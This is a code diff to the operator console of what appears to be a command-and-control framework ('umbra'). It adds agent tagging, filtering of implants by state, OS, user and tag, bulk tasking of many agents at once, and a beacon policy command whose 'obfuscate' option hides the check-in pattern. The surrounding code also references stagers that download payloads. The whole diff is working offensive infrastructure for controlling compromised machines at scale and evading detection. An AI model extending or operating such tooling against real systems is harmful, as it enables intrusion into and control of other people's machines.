@@ -107,11 +107,12 @@ def print_agents(agents: List[Dict[str, Any]]) -> None:
             a.get("state", "?"),
             a.get("transport", "?"),
             f"{a.get('sleep', '?')}s/{a.get('jitter', '?')}%",
+            ",".join(str(t) for t in (a.get("tags") or [])) or "-",
             fmt_ts(a.get("last_seen") if not isinstance(a.get("last_seen"), int) else a.get("last_seen")),
         ]
         for a in agents
     ]
-    print(table(["ID", "HOST", "OS", "USER", "STATE", "TRANSPORT", "BEACON", "LAST SEEN"], rows))
+    print(table(["ID", "HOST", "OS", "USER", "STATE", "TRANSPORT", "BEACON", "TAGS", "LAST SEEN"], rows))
 
 
 def print_whoami(data: Dict[str, Any]) -> None:
@@ -438,7 +439,31 @@ class Console:
             if cmd in ("help", "?", "h"):
                 print_help()
             elif cmd == "agents" or cmd == "ls":
-                print_agents(self.client.agents())
+                # `agents state=online tag=dc` narrows the inventory with the
+                # same filter language the server understands.
+                print_agents(self.client.agents(**parse_filter(" ".join(rest))))
+            elif cmd == "tag":
+                if len(rest) < 2:
+                    print("usage: tag <agent> <label>...")
+                    return True
+                mode = "remove" if "--remove" in rest else ("set" if "--set" in rest else "add")
+                labels = [t for t in rest[1:] if not t.startswith("--")]
+                data = self.client.tag_agents(labels, mode=mode, agents=[rest[0]])
+                print(f"{mode}: {', '.join(labels)} on {len(data.get('updated', []))} agent(s)")
+            elif cmd == "policy":
+                if len(rest) < 2:
+                    print("usage: policy <agent> sleep=60 jitter=35 [obfuscate=0]")
+                    return True
+                options = parse_filter(" ".join(rest[1:]))
+                sleep = int(options.get("sleep", 60))
+                jitter = int(options.get("jitter", 20))
+                obfuscate = None
+                if "obfuscate" in options:
+                    obfuscate = options["obfuscate"] not in ("0", "false", "no")
+                data = self.client.set_policy(sleep, jitter, obfuscate=obfuscate,
+                                              agents=[rest[0]])
+                print(f"policy pushed to {len(data.get('updated', []))} agent(s): "
+                      f"sleep {sleep}s, jitter {jitter}%")
             elif cmd == "use":
                 if not rest:
                     print(f"current agent: {self.current_agent or '(none)'}")
@@ -726,7 +751,9 @@ def print_help() -> None:
     print(
         """commands:
   help                      show this help
-  agents | ls               list agents
+  agents | ls [filter]      list agents (state=online, tag=dc, ...)
+  tag <agent> <label>       label an agent
+  policy <agent> sleep=60   push the beacon cadence
   whoami | me               your identity, role and allowed commands
   operators                 list connected operator consoles
   chat [@op] [message]      send (or read) operator chat
@@ -760,6 +787,25 @@ def print_help() -> None:
   raw <cmd> [json]          send a raw RPC
   quit                      disconnect and exit"""
     )
+
+
+def parse_filter(text: str) -> Dict[str, str]:
+    """Parse a filter string ("state=online,tag=dc") into a dictionary.
+
+    The console speaks the same filter language as the server, so an operator
+    can write the selection once and use it for finding agents and for acting
+    on them.
+    """
+    out: Dict[str, str] = {}
+    for part in (text or "").split(","):
+        part = part.strip()
+        if not part:
+            continue
+        key, _, value = part.partition("=")
+        key, value = key.strip(), value.strip()
+        if key and value:
+            out[key] = value
+    return out
 
 
 # ---------------------------------------------------------------------------
@@ -955,7 +1001,13 @@ def build_parser() -> argparse.ArgumentParser:
 
     sub = p.add_subparsers(dest="cmd")
 
-    sub.add_parser("agents", help="list agents")
+    agents_cmd = sub.add_parser("agents", help="list agents")
+    agents_cmd.add_argument("--state", default="", help="filter: online or offline")
+    agents_cmd.add_argument("--transport", default="", help="filter: tcp, http, ws, dns")
+    agents_cmd.add_argument("--os", default="", help="filter: the operating system")
+    agents_cmd.add_argument("--arch", default="", help="filter: the architecture")
+    agents_cmd.add_argument("--tag", default="", help="filter: agents carrying this tag")
+    agents_cmd.add_argument("--user", default="", help="filter: the account the beacon runs as")
     sub.add_parser("operators", help="list connected operator consoles")
     sub.add_parser("whoami", help="your operator identity, role and capabilities")
 
@@ -994,11 +1046,17 @@ def build_parser() -> argparse.ArgumentParser:
     run.add_argument("--timeout", type=float, default=120.0)
 
     task = sub.add_parser("task", help="queue an arbitrary task")
-    task.add_argument("agent")
-    task.add_argument("kind")
+    task.add_argument("agent", nargs="?", default="", help="agent id")
+    task.add_argument("kind", nargs="?", default="", help="task kind")
+    task.add_argument("--kind", dest="kind_flag", default="",
+                      help="task kind (use this with --agents, where there is no single agent)")
     task.add_argument("--args", default="{}", help="task arguments as JSON")
     task.add_argument("--wait", action="store_true")
     task.add_argument("--timeout", type=float, default=120.0)
+    task.add_argument("--agents", default="",
+                      help="comma separated agent ids: queue the task on all of them")
+    task.add_argument("--filter", default="",
+                      help="filter that selects the agents: state=online,tag=dc")
 
     down = sub.add_parser("download", help="pull a file from an agent (chunked)")
     down.add_argument("agent")
@@ -1014,9 +1072,11 @@ def build_parser() -> argparse.ArgumentParser:
     up.add_argument("--chunk", type=int, default=0, help="bytes per request (max 900 KiB)")
     up.add_argument("--timeout", type=float, default=120.0, help="per-chunk timeout")
 
-    tasks = sub.add_parser("tasks", help="list tasks for an agent")
-    tasks.add_argument("agent")
+    tasks = sub.add_parser("tasks", help="list tasks")
+    tasks.add_argument("agent", nargs="?", default="", help="agent id (omit for every agent)")
     tasks.add_argument("--limit", type=int, default=20)
+    tasks.add_argument("--kind", default="", help="filter: the task kind")
+    tasks.add_argument("--state", default="", help="filter: queued, delivered, done, failed")
 
     result = sub.add_parser("result", help="print a task result")
     result.add_argument("task_id")
@@ -1076,6 +1136,29 @@ def build_parser() -> argparse.ArgumentParser:
     stager.add_argument("--url", default="", help="url the stager downloads from")
     stager.add_argument("--sha256", default="", help="sha256 of the payload the stager fetches")
     stager.add_argument("--agent-id", default="", help="agent id to bake into the stager")
+
+    # -- beacon policy ----------------------------------------------------
+    policy = sub.add_parser("policy", help="push the cadence to one or many agents")
+    policy.add_argument("agent", nargs="?", default="", help="agent id")
+    policy.add_argument("--all", action="store_true",
+                        help="every agent that matches the filters")
+    policy.add_argument("--sleep", type=int, default=0, help="check-in interval in seconds")
+    policy.add_argument("--jitter", type=int, default=0, help="jitter in percent")
+    policy.add_argument("--obfuscate", dest="obfuscate", action="store_true", default=None,
+                        help="hide the check-in pattern (the default)")
+    policy.add_argument("--no-obfuscate", dest="obfuscate", action="store_false",
+                        help="keep a fixed check-in interval")
+    policy.add_argument("--state", default="", help="filter: online or offline")
+    policy.add_argument("--tag", default="", help="filter: agents carrying this tag")
+
+    tag = sub.add_parser("tag", help="label agents")
+    tag.add_argument("agent", nargs="?", default="", help="agent id")
+    tag.add_argument("labels", nargs="*", help="the tags to apply")
+    tag.add_argument("--remove", action="store_true", help="remove the tags instead")
+    tag.add_argument("--set", dest="replace", action="store_true",
+                     help="replace every tag of the agent")
+    tag.add_argument("--state", default="", help="filter: online or offline")
+    tag.add_argument("--match", default="", help="filter: agents carrying this tag")
 
     # -- local state ------------------------------------------------------
     dbcmd = sub.add_parser("db", help="the console's local state database (SQLite)")
@@ -1158,7 +1241,10 @@ def main(argv: Optional[List[str]] = None) -> int:
             print(json.dumps(payload, indent=2, sort_keys=True, default=json_default))
 
         if args.cmd == "agents":
-            rows = client.agents()
+            rows = client.agents(
+                state=args.state, transport=args.transport, os=args.os,
+                arch=args.arch, tag=args.tag, user=args.user,
+            )
             emit(rows) if args.json else print_agents(rows)
         elif args.cmd == "whoami":
             data = client.whoami()
@@ -1258,10 +1344,33 @@ def main(argv: Optional[List[str]] = None) -> int:
             except json.JSONDecodeError as exc:
                 print(f"invalid --args json: {exc}", file=sys.stderr)
                 return 2
-            task_id = client.submit(args.agent, args.kind, task_args)
-            console.note_task(task_id, args.agent, args.kind, task_args)
+            kind = args.kind_flag or args.kind
+            if not kind:
+                print("no task kind given", file=sys.stderr)
+                return 2
+            bulk_agents = [a.strip() for a in args.agents.split(",") if a.strip()]
+            bulk_filter = parse_filter(args.filter)
+            if bulk_agents or bulk_filter:
+                # The bulk path: one task, many agents.
+                rows = client.submit_bulk(kind, task_args,
+                                          agents=bulk_agents or None, **bulk_filter)
+                for row in rows:
+                    console.note_task(str(row.get("task_id", "")), str(row.get("agent_id", "")),
+                                      kind, task_args)
+                if args.json:
+                    emit({"tasks": rows, "count": len(rows)})
+                else:
+                    print(f"queued {len(rows)} task(s) of kind {kind}")
+                    for row in rows:
+                        print(f"  {row.get('agent_id', '?')} -> {row.get('task_id', '?')}")
+                return 0
+            if not args.agent:
+                print("no agent given", file=sys.stderr)
+                return 2
+            task_id = client.submit(args.agent, kind, task_args)
+            console.note_task(task_id, args.agent, kind, task_args)
             if args.json and not args.wait:
-                emit({"task_id": task_id, "agent": args.agent, "kind": args.kind})
+                emit({"task_id": task_id, "agent": args.agent, "kind": kind})
             else:
                 print(f"queued {task_id}")
             if args.wait:
@@ -1296,7 +1405,7 @@ def main(argv: Optional[List[str]] = None) -> int:
                 f" sha256={info['sha256'][:16]}…"
             )
         elif args.cmd == "tasks":
-            rows = client.tasks(args.agent, args.limit)
+            rows = client.tasks(args.agent, args.limit, kind=args.kind, state=args.state)
             emit(rows) if args.json else print_tasks(rows)
         elif args.cmd == "result":
             task = client.task(args.task_id)
@@ -1438,6 +1547,44 @@ def main(argv: Optional[List[str]] = None) -> int:
                     emit({"task_id": task_id, "name": args.name, "agent": args.agent})
                 else:
                     print(f"queued {task_id} ({args.name} on {args.agent})")
+        elif args.cmd == "policy":
+            if args.sleep <= 0 and args.jitter <= 0 and args.obfuscate is None:
+                print("usage: umbra policy <agent> --sleep N --jitter P "
+                      "[--obfuscate|--no-obfuscate]", file=sys.stderr)
+                return 2
+            if not args.agent and not args.all:
+                print("name an agent or pass --all with a filter", file=sys.stderr)
+                return 2
+            sleep = args.sleep if args.sleep > 0 else 60
+            jitter = args.jitter if args.jitter > 0 else 20
+            data = client.set_policy(
+                sleep, jitter, obfuscate=args.obfuscate,
+                agents=[args.agent] if args.agent else None,
+                state=args.state, tag=args.tag,
+            )
+            updated = data.get("updated", [])
+            if args.json:
+                emit(data)
+            else:
+                print(f"policy pushed to {len(updated)} agent(s): "
+                      f"sleep {sleep}s, jitter {jitter}%"
+                      + ("" if args.obfuscate is None
+                         else (", obfuscated" if args.obfuscate else ", fixed interval")))
+        elif args.cmd == "tag":
+            labels = [t.strip() for t in args.labels if t.strip()]
+            if not labels:
+                print("usage: umbra tag <agent> <label> [--remove|--set]", file=sys.stderr)
+                return 2
+            mode = "remove" if args.remove else ("set" if args.replace else "add")
+            data = client.tag_agents(
+                labels, mode=mode,
+                agents=[args.agent] if args.agent else None,
+                state=args.state, tag=args.match,
+            )
+            if args.json:
+                emit(data)
+            else:
+                print(f"{mode}: {', '.join(labels)} on {len(data.get('updated', []))} agent(s)")
         elif args.cmd == "team-sync":
             data = client.team_sync()
             if args.json:
